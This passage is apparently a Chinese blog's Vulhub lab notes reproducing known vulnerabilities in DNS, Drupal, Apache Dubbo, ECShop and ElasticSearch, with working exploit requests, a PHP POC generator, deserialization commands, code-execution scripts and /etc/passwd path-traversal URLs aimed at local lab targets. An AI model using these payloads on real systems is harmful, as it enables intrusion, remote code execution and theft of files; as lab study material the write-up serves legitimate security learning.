id="DNS域传送漏洞"><a href="#DNS域传送漏洞" class="headerlink" title="DNS域传送漏洞"></a>DNS域传送漏洞</h1><p>DNS协议支持使用axfr类型的记录进行区域传送，用来解决主从同步的问题。如果管理员在配置DNS服务器的时候没有限制允许获取记录的来源，将会导致DNS域传送漏洞。</p><p>参考链接：</p><ul><li><a href="https://www.acunetix.com/blog/articles/dns-zone-transfers-axfr/">https://www.acunetix.com/blog/articles/dns-zone-transfers-axfr/</a></li><li><a href="https://nmap.org/nsedoc/scripts/dns-zone-transfer.html">https://nmap.org/nsedoc/scripts/dns-zone-transfer.html</a></li></ul><h2 id="漏洞复现-36"><a href="#漏洞复现-36" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>在Linux下，我们可以使用dig命令来发送dns请求。比如，我们可以用<code>dig @your-ip www.vulhub.org</code>获取域名<code>www.vulhub.org</code>在目标dns服务器上的A记录：</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/81.jpg" alt="81"></p><blockquote><p>发送axfr类型的dns请求：<code>dig @your-ip -t axfr vulhub.org</code></p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/82.jpg" alt="82"></p><blockquote><p>可见，我获取到了<code>vulhub.org</code>的所有子域名记录，这里存在DNS域传送漏洞。</p><p>我们也可以用nmap script来扫描该漏洞：<code>nmap --script dns-zone-transfer.nse --script-args "dns-zone-transfer.domain=vulhub.org" -Pn -p 53 192.168.0.196</code></p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/83.jpg" alt="83"></p><h1 id="Drupal-7-32-“Drupalgeddon”-SQL注入漏洞（CVE-2014-3704）"><a href="#Drupal-7-32-“Drupalgeddon”-SQL注入漏洞（CVE-2014-3704）" class="headerlink" title="Drupal < 7.32 “Drupalgeddon” SQL注入漏洞（CVE-2014-3704）"></a>Drupal &lt; 7.32 “Drupalgeddon” SQL注入漏洞（CVE-2014-3704）</h1><blockquote><p>Drupal 是一款用量庞大的CMS，其7.0~7.31版本中存在一处无需认证的SQL漏洞。通过该漏洞，攻击者可以执行任意SQL语句，插入、修改管理员信息，甚至执行任意代码。</p></blockquote><h2 id="漏洞复现-37"><a href="#漏洞复现-37" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>该漏洞无需认证，发送如下数据包即可执行恶意SQL语句：</p><pre class="line-numbers language-none"><code class="language-none">POST /?q=node&amp;destination=node HTTP/1.1Host: your-ip:8080Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 120pass=lol&amp;form_build_id=&amp;form_id=user_login_block&amp;op=Log+in&amp;name[0 or updatexml(0,concat(0xa,user()),0)%23]=bob&amp;name[0]=a<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可见，信息已被爆出：</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/84.jpg" alt="84"></p><h1 id="Drupal-Core-8-PECL-YAML-反序列化任意代码执行漏洞（CVE-2017-6920）（未完成）"><a href="#Drupal-Core-8-PECL-YAML-反序列化任意代码执行漏洞（CVE-2017-6920）（未完成）" class="headerlink" title="Drupal Core 8 PECL YAML 反序列化任意代码执行漏洞（CVE-2017-6920）（未完成）"></a>Drupal Core 8 PECL YAML 反序列化任意代码执行漏洞（CVE-2017-6920）（未完成）</h1><blockquote><ul><li>影响软件：Drupal</li><li>方式：反序列化</li><li>参考链接：<a href="https://paper.seebug.org/334/">CVE-2017-6920:Drupal远程代码执行漏洞分析及POC构造</a></li><li>效果：任意代码执行</li></ul></blockquote><h2 id="漏洞复现-38"><a href="#漏洞复现-38" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>apt update网络超时…<br>先跳了</p><h1 id="Drupal-Drupalgeddon-2-远程代码执行漏洞（CVE-2018-7600）"><a href="#Drupal-Drupalgeddon-2-远程代码执行漏洞（CVE-2018-7600）" class="headerlink" title="Drupal Drupalgeddon 2 远程代码执行漏洞（CVE-2018-7600）"></a>Drupal Drupalgeddon 2 远程代码执行漏洞（CVE-2018-7600）</h1><blockquote><p>Drupal 是一款用量庞大的CMS，其6/7/8版本的Form API中存在一处远程代码执行漏洞。相关分析如下：</p><ul><li><a href="https://research.checkpoint.com/uncovering-drupalgeddon-2/">https://research.checkpoint.com/uncovering-drupalgeddon-2/</a></li></ul></blockquote><h2 id="漏洞复现-39"><a href="#漏洞复现-39" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p> 参考<a href="https://github.com/a2u/CVE-2018-7600/blob/master/exploit.py">a2u/CVE-2018-7600</a>，我们向安装完成的drupal发送如下数据包：</p><pre class="line-numbers language-none"><code class="language-none">POST /user/register?element_parents=account/mail/%23value&amp;ajax_form=1&amp;_wrapper_format=drupal_ajax HTTP/1.1Host: your-ip:8080Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 103form_id=user_register_form&amp;_drupal_ajax=1&amp;mail[#post_render][]=exec&amp;mail[#type]=markup&amp;mail[#markup]=id<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>成功执行代码，这个代码最终执行了id命令：</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/85.jpg" alt="85"></p><h1 id="Drupal-远程代码执行漏洞（CVE-2018-7602）"><a href="#Drupal-远程代码执行漏洞（CVE-2018-7602）" class="headerlink" title="Drupal 远程代码执行漏洞（CVE-2018-7602）"></a>Drupal 远程代码执行漏洞（CVE-2018-7602）</h1><blockquote><ul><li>影响软件：drupal</li><li>方式：对URL中的#进行编码两次，绕过sanitize()函数过滤</li><li>效果：任意命令执行</li></ul></blockquote><h2 id="漏洞复现-40"><a href="#漏洞复现-40" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>参考<a href="https://github.com/pimps/CVE-2018-7600/blob/master/drupa7-CVE-2018-7602.py">pimps/CVE-2018-7600</a>的PoC。</p><p>如下图所示，执行以下命令即可复现该漏洞。示例命令为 <code>id</code>，如图红框中显示，可以执行该命令。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"># "id"为要执行的命令 第一个drupal为用户名 第二个drupal为密码python3 drupa7-CVE-2018-7602.py -c "id" drupal drupal http://127.0.0.1:8081/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/86.jpg" alt="86"></p><h1 id="Drupal-远程代码执行漏洞（CVE-2019-6339）"><a href="#Drupal-远程代码执行漏洞（CVE-2019-6339）" class="headerlink" title="Drupal 远程代码执行漏洞（CVE-2019-6339）"></a>Drupal 远程代码执行漏洞（CVE-2019-6339）</h1><blockquote><ul><li>影响软件：Drupal</li><li>方式：phar反序列化RCE</li><li>参考链接：<a href="https://paper.seebug.org/897/">Drupal 1-click to RCE 分析</a></li><li>效果：任意命令执行</li></ul></blockquote><h2 id="漏洞复现-41"><a href="#漏洞复现-41" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>如下图所示，先使用管理员用户上传头像，头像图片为构造好的 PoC，参考<a href="https://github.com/thezdi/PoC/tree/master/Drupal">thezdi/PoC</a>的PoC。</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/87.jpg" alt="87"></p><blockquote><p>Drupal 的图片默认存储位置为 <code>/sites/default/files/pictures/&lt;YYYY-MM&gt;/</code>，默认存储名称为其原来的名称，所以之后在利用漏洞时，可以知道上传后的图片的具体位置。</p><p>访问 <code>http://127.0.0.1:8080/admin/config/media/file-system</code>，在 <code>Temporary directory</code> 处输入之前上传的图片路径，示例为 <code>phar://./sites/default/files/pictures/2019-06/blog-ZDI-CAN-7232-cat_0.jpg</code>，保存后将触发该漏洞。如下图所示，触发成功。</p></blockquote><p>如果不知道图片具体目录可以查看docker下的file目录或使用find命令<br><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/88.jpg" alt="88"></p><h1 id="Drupal-XSS漏洞（CVE-2019-6341）"><a href="#Drupal-XSS漏洞（CVE-2019-6341）" class="headerlink" title="Drupal XSS漏洞（CVE-2019-6341）"></a>Drupal XSS漏洞（CVE-2019-6341）</h1><blockquote><ul><li>影响软件：Drupal</li><li>方式：通过文件模块或者子系统上传恶意文件触发XSS漏洞</li><li>参考链接：<a href="https://paper.seebug.org/897/">Drupal 1-click to RCE 分析</a></li><li>效果：JS代码执行（Cookies 资料窃取、会话劫持、钓鱼欺骗、网页挂马等）</li></ul></blockquote><h2 id="漏洞复现-42"><a href="#漏洞复现-42" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>该漏洞需要利用drupal文件模块上传文件的漏洞，伪造一个图片文件，上传，文件的内容实际是一段HTML代码，内嵌JS，这样其他用户在访问这个链接时，就可能触发XSS漏洞。</p><p>Drupal 的图片默认存储位置为 <code>/sites/default/files/pictures/&lt;YYYY-MM&gt;/</code>，默认存储名称为其原来的名称，所以之后在利用漏洞时，可以知道上传后的图片的具体位置。</p><p>使用PoC上传构造好的伪造GIF文件，PoC参考<a href="https://github.com/thezdi/PoC/tree/master/Drupal">thezdi/PoC</a>的PoC。</p><p>如图，输入如下命令，即可使用PoC构造样本并完成上传功能，第一个参数为目标IP 第二个参数为目标端口。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">php cve-2019-6341-exp.php 192.168.11.1 8080<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/90.jpg" alt="90"></p><blockquote><p>上传成功后，访问图片位置，即可触发 XSS 漏洞，如下图所示。</p><p>Tips:</p><ol><li>因为 Chrome 和 FireFox 浏览器自带部分过滤 XSS 功能，所以验证存在时可使用 Edge 浏览器或者 IE 浏览器。</li><li>访问的图片名称为_0的原因是因为 Drupal 的规则机制，具体原理见<a href="https://paper.seebug.org/897/">Drupal 1-click to RCE 分析</a></li></ol></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/89.jpg" alt="89"></p><h1 id="Aapche-Dubbo-Java反序列化漏洞（CVE-2019-17564）"><a href="#Aapche-Dubbo-Java反序列化漏洞（CVE-2019-17564）" class="headerlink" title="Aapche Dubbo Java反序列化漏洞（CVE-2019-17564）"></a>Aapche Dubbo Java反序列化漏洞（CVE-2019-17564）</h1><blockquote><p>Apache Dubbo是一款高性能、轻量级的开源Java RPC服务框架。Dubbo可以使用不同协议通信，当使用http协议时，Apache Dubbo直接使用了Spring框架的<code>org.springframework.remoting.httpinvoker.HttpInvokerServiceExporter</code>类做远程调用，而这个过程会读取POST请求的Body并进行反序列化，最终导致漏洞。</p><p>在Spring文档中，对<code>HttpInvokerServiceExporter</code>有如下描述，并不建议使用：</p><blockquote><p>WARNING: Be aware of vulnerabilities due to unsafe Java deserialization: Manipulated input streams could lead to unwanted code execution on the server during the deserialization step. As a consequence, do not expose HTTP invoker endpoints to untrusted clients but rather just between your own services. In general, we strongly recommend any other message format (e.g. JSON) instead.</p></blockquote><p>这个漏洞影响Apache Dubbo 2.7.4及以前版本，2.7.5后Dubbo使用<code>com.googlecode.jsonrpc4j.JsonRpcServer</code>替换了<code>HttpInvokerServiceExporter</code>。</p><p>参考链接：</p><ul><li><a href="https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/remoting/httpinvoker/HttpInvokerServiceExporter.html">https://docs.spring.io/spring-framework/docs/current/javadoc-api/org/springframework/remoting/httpinvoker/HttpInvokerServiceExporter.html</a></li><li><a href="https://www.anquanke.com/post/id/198747">https://www.anquanke.com/post/id/198747</a></li><li><a href="https://paper.seebug.org/1128/">https://paper.seebug.org/1128/</a></li></ul></blockquote><h2 id="漏洞复现-43"><a href="#漏洞复现-43" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>利用该漏洞需要先知道目标RPC接口名，而Dubbo所有的RPC配置储存在registry中，通常使用Zookeeper作为registry。如果能刚好找到目标的Zookeeper未授权访问漏洞，那么就可以在其中找到接口的名称与地址。</p><p>Vulhub对外开放了8080端口和2181端口，其中2181即为Zookeeper的端口，我们本地下载<a href="https://zookeeper.apache.org/">Zookeeper</a>，使用其中自带的<strong>zkCli</strong>即可连接到这台Zookeeper服务器：</p><pre class="line-numbers language-none"><code class="language-none">./zkCli -server target-ip:2181<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>连接后进入一个交互式控制台，使用<code>ls</code>即可列出其中所有节点，包括Dubbo相关的配置：</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/91.jpg" alt="91"><br><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/92.jpg" alt="92"></p><blockquote><p>获取到RPC接口名为<code>org.vulhub.api.CalcService</code>。直接用ysoserial生成CommonsCollections6的Payload作为POST Body发送到<code>http://your-ip:8080/org.vulhub.api.CalcService</code>即可触发反序列化漏洞：</p><pre class="line-numbers language-none"><code class="language-none">java -jar ysoserial.jar CommonsCollections6 "touch /tmp/success" &gt; 1.poccurl -XPOST --data-binary @1.poc http://your-ip:8080/org.vulhub.api.CalcService<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>进入容器，可见<code>touch /tmp/success</code>已成功执行。</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/94.jpg" alt="94"></p><h1 id="ECShop-2-x-3-x-SQL注入-任意代码执行漏洞"><a href="#ECShop-2-x-3-x-SQL注入-任意代码执行漏洞" class="headerlink" title="ECShop 2.x/3.x SQL注入/任意代码执行漏洞"></a>ECShop 2.x/3.x SQL注入/任意代码执行漏洞</h1><blockquote><p>ECShop是一款B2C独立网店系统，适合企业及个人快速构建个性化网上商店。系统是基于PHP语言及MYSQL数据库构架开发的跨平台开源程序。</p><p>其2017年及以前的版本中，存在一处SQL注入漏洞，通过该漏洞可注入恶意数据，最终导致任意代码执行漏洞。其3.6.0最新版已修复该漏洞，vulhub中使用其2.7.3最新版与3.6.0次新版进行漏洞复现。</p><p>参考链接：</p><ul><li><a href="https://paper.seebug.org/691/">https://paper.seebug.org/691/</a></li></ul></blockquote><h2 id="漏洞复现-44"><a href="#漏洞复现-44" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>我编写了一个脚本，可以生成2.x和3.x的POC：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php$shell = bin2hex("{\$asd'];phpinfo\t();//}xxx");$id = "-1' UNION/*";$arr = [    "num" =&gt; sprintf('*/SELECT 1,0x%s,2,4,5,6,7,8,0x%s,10-- -', bin2hex($id), $shell),    "id" =&gt; $id];$s = serialize($arr);$hash3 = '45ea207d7a2b68c49582d2d22adf953a';$hash2 = '554fcae493e564ee0dc75bdf2ebf94ca';echo "POC for ECShop 2.x: \n";echo "{$hash2}ads|{$s}{$hash2}";echo "\n\nPOC for ECShop 3.x: \n";echo "{$hash3}ads|{$s}{$hash3}";<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>生成的POC，放在Referer里发送：</p><pre class="line-numbers language-none"><code class="language-none">GET /user.php?act=login HTTP/1.1Host: your-ipUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Cookie: PHPSESSID=9odrkfn7munb3vfksdhldob2d0; ECS_ID=1255e244738135e418b742b1c9a60f5486aa4559; ECS[visit_times]=1Referer: 45ea207d7a2b68c49582d2d22adf953aads|a:2:{s:3:"num";s:107:"*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b706870696e666f0928293b2f2f7d787878,10-- -";s:2:"id";s:11:"-1' UNION/*";}45ea207d7a2b68c49582d2d22adf953aConnection: closeUpgrade-Insecure-Requests: 1Cache-Control: max-age=0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2.x的执行结果</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/95.jpg" alt="95"></p><blockquote><p>3.x的执行结果：</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/96.jpg" alt="96"></p><h1 id="ElasticSearch-命令执行漏洞（CVE-2014-3120）测试环境"><a href="#ElasticSearch-命令执行漏洞（CVE-2014-3120）测试环境" class="headerlink" title="ElasticSearch 命令执行漏洞（CVE-2014-3120）测试环境"></a>ElasticSearch 命令执行漏洞（CVE-2014-3120）测试环境</h1><blockquote><p>jre版本：openjdk:8-jre</p><p>elasticsearch版本：v1.1.1</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>相关文档：<a href="http://bouk.co/blog/elasticsearch-rce/">http://bouk.co/blog/elasticsearch-rce/</a> 、 <a href="https://www.t00ls.net/viewthread.php?tid=29408">https://www.t00ls.net/viewthread.php?tid=29408</a></p><p>老版本ElasticSearch支持传入动态脚本（MVEL）来执行一些复杂的操作，而MVEL可执行Java代码，而且没有沙盒，所以我们可以直接执行任意代码。</p><p>MVEL执行命令的代码如下：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec("id").getInputStream()).useDelimiter("\\A").next();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></blockquote><h2 id="漏洞复现-45"><a href="#漏洞复现-45" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>将Java代码放入json中：</p><pre class="line-numbers language-json" data-language="json"><code class="language-json">{    "size": 1,    "query": {      "filtered": {        "query": {          "match_all": {          }        }      }    },    "script_fields": {        "command": {            "script": "import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\"id\").getInputStream()).useDelimiter(\"\\\\A\").next();"        }    }  }<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>首先，该漏洞需要es中至少存在一条数据，所以我们需要先创建一条数据：</p><pre class="line-numbers language-none"><code class="language-none">POST /website/blog/ HTTP/1.1Host: your-ip:9200Accept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 25{  "name": "phithon"}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/97.jpg" alt="97"></p><blockquote><p>然后，执行任意代码：</p><pre class="line-numbers language-none"><code class="language-none">POST /_search?pretty HTTP/1.1Host: your-ip:9200Accept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 343{    "size": 1,    "query": {      "filtered": {        "query": {          "match_all": {          }        }      }    },    "script_fields": {        "command": {            "script": "import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\"id\").getInputStream()).useDelimiter(\"\\\\A\").next();"        }    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结果如图：</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/98.jpg" alt="98"></p><h1 id="ElasticSearch-Groovy-沙盒绕过-代码执行漏洞（CVE-2015-1427）测试环境"><a href="#ElasticSearch-Groovy-沙盒绕过-代码执行漏洞（CVE-2015-1427）测试环境" class="headerlink" title="ElasticSearch Groovy 沙盒绕过 &amp;&amp; 代码执行漏洞（CVE-2015-1427）测试环境"></a>ElasticSearch Groovy 沙盒绕过 &amp;&amp; 代码执行漏洞（CVE-2015-1427）测试环境</h1><blockquote><p>jre版本：openjdk:8-jre</p><p>elasticsearch版本：v1.4.2</p><h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><p>参考文章：</p><ul><li><a href="http://cb.drops.wiki/drops/papers-5107.html">http://cb.drops.wiki/drops/papers-5107.html</a></li><li><a href="http://jordan-wright.com/blog/2015/03/08/elasticsearch-rce-vulnerability-cve-2015-1427/">http://jordan-wright.com/blog/2015/03/08/elasticsearch-rce-vulnerability-cve-2015-1427/</a></li><li><a href="https://github.com/XiphosResearch/exploits">https://github.com/XiphosResearch/exploits</a></li><li><a href="http://cb.drops.wiki/drops/papers-5142.html">http://cb.drops.wiki/drops/papers-5142.html</a></li></ul><p>CVE-2014-3120后，ElasticSearch默认的动态脚本语言换成了Groovy，并增加了沙盒，但默认仍然支持直接执行动态语言。本漏洞：1.是一个沙盒绕过； 2.是一个Goovy代码执行漏洞。</p><h2 id="Groovy语言“沙盒”"><a href="#Groovy语言“沙盒”" class="headerlink" title="Groovy语言“沙盒”"></a>Groovy语言“沙盒”</h2><p>ElasticSearch支持使用“在沙盒中的”Groovy语言作为动态脚本，但显然官方的工作并没有做好。lupin和tang3分别提出了两种执行命令的方法：</p><ol><li>既然对执行Java代码有沙盒，lupin的方法是想办法绕过沙盒，比如使用Java反射</li><li>Groovy原本也是一门语言，于是tang3另辟蹊径，使用Groovy语言支持的方法，来直接执行命令，无需使用Java语言</li></ol><p>所以，根据这两种执行漏洞的思路，我们可以获得两个不同的POC。</p><p>Java沙盒绕过法：</p><pre class="line-numbers language-none"><code class="language-none">java.lang.Math.class.forName("java.lang.Runtime").getRuntime().exec("id").getText()<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Goovy直接执行命令法：</p><pre class="line-numbers language-none"><code class="language-none">def command='id';def res=command.execute().text;res<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><h2 id="漏洞复现-46"><a href="#漏洞复现-46" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>由于查询时至少要求es中有一条数据，所以发送如下数据包，增加一个数据：</p><pre class="line-numbers language-none"><code class="language-none">POST /website/blog/ HTTP/1.1Host: your-ip:9200Accept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 25{  "name": "test"}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/99.jpg" alt="99"></p><blockquote><p>然后发送包含payload的数据包，执行任意命令：</p><pre class="line-numbers language-none"><code class="language-none">POST /_search?pretty HTTP/1.1Host: your-ip:9200Accept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: application/textContent-Length: 156{"size":1, "script_fields": {"lupin":{"lang":"groovy","script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\").getText()"}}}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/100.jpg" alt="100"></p><h1 id="ElasticSearch-目录穿越漏洞（CVE-2015-3337）测试环境"><a href="#ElasticSearch-目录穿越漏洞（CVE-2015-3337）测试环境" class="headerlink" title="ElasticSearch 目录穿越漏洞（CVE-2015-3337）测试环境"></a>ElasticSearch 目录穿越漏洞（CVE-2015-3337）测试环境</h1><blockquote><p>jre版本：openjdk:8-jre</p><p>elasticsearch版本：v1.4.4</p><p>影响版本：1.4.5以下/1.5.2以下</p><h2 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h2><p>在安装了具有“site”功能的插件以后，插件目录使用<code>../</code>即可向上跳转，导致目录穿越漏洞，可读取任意文件。没有安装任意插件的elasticsearch不受影响。</p></blockquote><h2 id="漏洞复现-47"><a href="#漏洞复现-47" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><p>测试环境默认安装了一个插件：<code>elasticsearch-head</code>，主页在此：<a href="https://github.com/mobz/elasticsearch-head">https://github.com/mobz/elasticsearch-head</a></p><p>访问<code>http://your-ip:9200/_plugin/head/../../../../../../../../../etc/passwd</code>读取任意文件（不要在浏览器访问）：</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/101.jpg" alt="101"></p><h1 id="ElasticSearch-目录穿越漏洞（CVE-2015-5531）"><a href="#ElasticSearch-目录穿越漏洞（CVE-2015-5531）" class="headerlink" title="ElasticSearch 目录穿越漏洞（CVE-2015-5531）"></a>ElasticSearch 目录穿越漏洞（CVE-2015-5531）</h1><blockquote><p>jre版本：openjdk:8-jre</p><p>elasticsearch版本：v1.6.0</p><p>影响版本：1.6.1以下</p><h2 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h2><p>参考文章</p><ul><li><a href="https://www.exploit-db.com/exploits/38383/">https://www.exploit-db.com/exploits/38383/</a></li><li><a href="http://www.freebuf.com/vuls/99942.html">http://www.freebuf.com/vuls/99942.html</a></li></ul><p>说明：</p><p>elasticsearch 1.5.1及以前，无需任何配置即可触发该漏洞。之后的新版，配置文件elasticsearch.yml中必须存在<code>path.repo</code>，该配置值为一个目录，且该目录必须可写，等于限制了备份仓库的根位置。不配置该值，默认不启动这个功能。</p></blockquote><h2 id="漏洞复现-48"><a href="#漏洞复现-48" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><blockquote><h3 id="1-新建一个仓库"><a href="#1-新建一个仓库" class="headerlink" title="1. 新建一个仓库"></a>1. 新建一个仓库</h3><pre class="line-numbers language-none"><code class="language-none">PUT /_snapshot/test HTTP/1.1Host: your-ip:9200Accept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 108{    "type": "fs",    "settings": {        "location": "/usr/share/elasticsearch/repo/test"     }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/102.jpg" alt="102"></p><blockquote><h3 id="2-创建一个快照"><a href="#2-创建一个快照" class="headerlink" title="2. 创建一个快照"></a>2. 创建一个快照</h3><pre class="line-numbers language-none"><code class="language-none">PUT /_snapshot/test2 HTTP/1.1Host: your-ip:9200Accept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 108{    "type": "fs",    "settings": {        "location": "/usr/share/elasticsearch/repo/test/snapshot-backdata"     }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/103.jpg" alt="103"></p><blockquote><h3 id="3-目录穿越读取任意文件"><a href="#3-目录穿越读取任意文件" class="headerlink" title="3. 目录穿越读取任意文件"></a>3. 目录穿越读取任意文件</h3><p>访问 <code>http://your-ip:9200/_snapshot/test/backdata%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd</code></p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/104.jpg" alt="104"></p><blockquote><p>如上图，在错误信息中包含文件内容（编码后），对其进行解码即可获得文件：</p></blockquote><p><img data-src="/2024/09/30/Vulhub%E8%AE%B0%E5%BD%95/105.jpg" alt="105"></p><h1 id="Elasticsearch写入webshell漏洞（WooYun-2015-110216）"><a href="#Elasticsearch写入webshell漏洞（WooYun-2015-110216）" class="headerlink" title="Elasticsearch写入webshell漏洞（WooYun-2015-110216）"></a>Elasticsearch写入webshell漏洞（WooYun-2015-110216）</h1><blockquote><p>参考文章： <a href="http://cb.drops.wiki/bugs/wooyun-2015-0110216.html">http://cb.drops.wiki/bugs/wooyun-2015-0110216.html</a></p><h2 id="原理-4"><a href="#原理-4" class="headerlink" 